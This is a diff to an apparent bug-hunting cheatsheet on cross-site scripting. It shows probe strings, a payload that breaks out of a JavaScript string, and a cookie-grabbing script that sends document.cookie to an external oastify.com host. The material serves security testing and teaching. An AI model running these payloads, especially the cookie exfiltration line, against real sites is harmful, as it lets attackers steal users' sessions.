@@ -25,10 +25,12 @@ If this is the case, you should inject this payloads.
 Inject ```<xss123>'"``` and see if your payload encoded in a javascript code.<br>
 ![Screenshot from 2024-06-13 00-19-30](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/9180969c-2299-4adf-9c4a-a05e97629938)<br>
 In this case you should try this payload to braek the code to inject maliciuos payload.
-
 ```js
 xss';alert(1);'xss
 ```
+Finally the code will look like this after response.
+![Screenshot from 2024-06-13 00-27-23](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/363ddd77-30a1-48bc-850a-f85b0b92e312)
+
 #### For cookie grabbing.
 ```js
 <script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
